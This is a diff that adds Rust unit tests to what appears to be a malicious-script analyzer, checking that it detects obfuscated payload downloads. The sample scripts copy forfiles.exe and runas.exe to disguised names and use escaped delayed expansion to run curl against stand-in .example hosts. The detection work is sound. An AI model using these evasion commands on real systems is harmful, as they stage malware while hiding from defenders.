@@ -24073,6 +24073,27 @@ C:\Users\Public\ff.tmp /m *.txt /c "cmd /c curl -o out.exe https://copied-forfil
     }
 
     #[test]
+    fn copied_forfiles_alias_comspec_child_preserves_escaped_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\forfiles.exe C:\Users\Public\ff.tmp
+C:\Users\Public\ff.tmp /p C:\Windows /m notepad.exe /c "%COMSPEC% /V:ON /c set U=https://copied-forfiles-delayed.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-forfiles-delayed.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "copied forfiles escaped delayed child was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn copied_cmd_alias_v_on_child_preserves_escaped_delayed_expansion() {
         let report = analyze(
             br#"copy C:\Windows\System32\cmd.exe C:\Users\Public\cm.tmp
@@ -24244,6 +24265,25 @@ C:\Users\Public\ra.tmp /user:Administrator "cmd.exe /c curl -o out.exe https://c
             )),
             "copied runas child command was not analyzed: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn copied_runas_alias_comspec_child_preserves_escaped_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\runas.exe C:\Users\Public\ra.tmp
+C:\Users\Public\ra.tmp /user:DOMAIN\admin "%COMSPEC% /V:ON /c set U=https://copied-runas-delayed.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-runas-delayed.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied runas escaped delayed child was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 
